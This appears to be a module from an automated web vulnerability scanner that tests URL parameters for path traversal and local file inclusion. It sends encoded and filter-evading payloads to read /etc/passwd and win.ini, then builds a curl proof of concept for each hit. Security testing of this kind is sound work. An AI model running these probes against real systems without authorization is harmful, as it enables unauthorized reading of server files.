"""Path Traversal & Local File Inclusion Attack Module (V15).

Verifies arbitrary file read and path traversal vulnerabilities:
- Canonicalization breakouts: ../, ....//, %2e%2e%2f, ..\\
- Target system files: Linux /etc/passwd (root:x:0:0:), Windows win.ini ([extensions])
- Strict signature verification to eliminate false positive mirrors.
"""

from __future__ import annotations

import logging
import re
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.traversal")

TRAVERSAL_PAYLOADS = [
    ("../../../../etc/passwd", r"root:.*:0:0:", "Linux /etc/passwd"),
    ("....//....//....//....//etc/passwd", r"root:.*:0:0:", "Linux /etc/passwd (Bypass)"),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", r"root:.*:0:0:", "Linux /etc/passwd (Encoded)"),
    ("../../../../windows/win.ini", r"\[(extensions|fonts|files)\]", "Windows win.ini"),
    ("..\\..\\..\\..\\windows\\win.ini", r"\[(extensions|fonts|files)\]", "Windows win.ini (Backslash)"),
]


class TraversalAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="traversal", cwe_id="CWE-22", default_severity="HIGH")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            parsed = urlparse(u)
            if parsed.query:
                params = parse_qs(parsed.query)
                for p in params:
                    if any(k in p.lower() for k in ("file", "path", "doc", "page", "template", "view", "include", "dir")):
                        opps.append(
                            AttackOpportunity(
                                target=target,
                                endpoint=u,
                                parameter=p,
                                attack_type="traversal",
                                hypothesis=f"Path parameter '{p}' on {parsed.path} may allow system file traversal.",
                                priority=91,
                            )
                        )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        return AttackPlan(
            title=f"Path Traversal & LFI Audit on {opportunity.parameter}",
            attack_type="traversal",
            target=opportunity.endpoint,
            steps=[
                "1. Baseline response capture",
                "2. Standard relative traversal (../../../../etc/passwd)",
                "3. Filter evasion breakouts (....// and URL-encoded dots)",
                "4. Windows win.ini traversal testing",
            ],
            payloads=[p[0] for p in TRAVERSAL_PAYLOADS],
            expected_evidence="Reflection of system password entries or Windows OS config sections.",
            context={"parameter": opportunity.parameter},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        param = opportunity.parameter
        if not param:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="traversal",
                target_url=endpoint,
                message="No parameter specified for traversal testing.",
            )

        parsed = urlparse(endpoint)
        query_params = parse_qs(parsed.query)

        # Baseline request
        baseline_resp = await session.get(endpoint)
        baseline_body = baseline_resp.text.lower()

        for payload, regex_pat, desc in TRAVERSAL_PAYLOADS:
            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(t_params, doseq=True), parsed.fragment))

            resp = await session.get(probe_url)
            resp_body = resp.text

            if resp.status_code == 200 and re.search(regex_pat, resp_body, re.I):
                # Ensure the pattern was not already present in the baseline
                if not re.search(regex_pat, baseline_body, re.I):
                    poc_curl = f"curl -s -k '{probe_url}'"
                    return ValidationResult(
                        is_vulnerable=True,
                        confidence=0.98,
                        proof_level="P3",
                        attack_type="traversal",
                        target_url=endpoint,
                        parameter=param,
                        baseline_status=baseline_resp.status_code,
                        exploit_status=resp.status_code,
                        evidence={
                            "target_file": desc,
                            "payload": payload,
                            "matched_signature": regex_pat,
                            "response_sample": resp_body[:300],
                        },
                        poc_curl=poc_curl,
                        message=f"CRITICAL: Path Traversal / Arbitrary File Read confirmed on parameter '{param}' ({desc}).",
                        cwe_id="CWE-22",
                        severity="HIGH",
                    )

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.2,
            proof_level="P0",
            attack_type="traversal",
            target_url=endpoint,
            parameter=param,
            message=f"Parameter '{param}' did not yield system file contents upon traversal attempts.",
        )
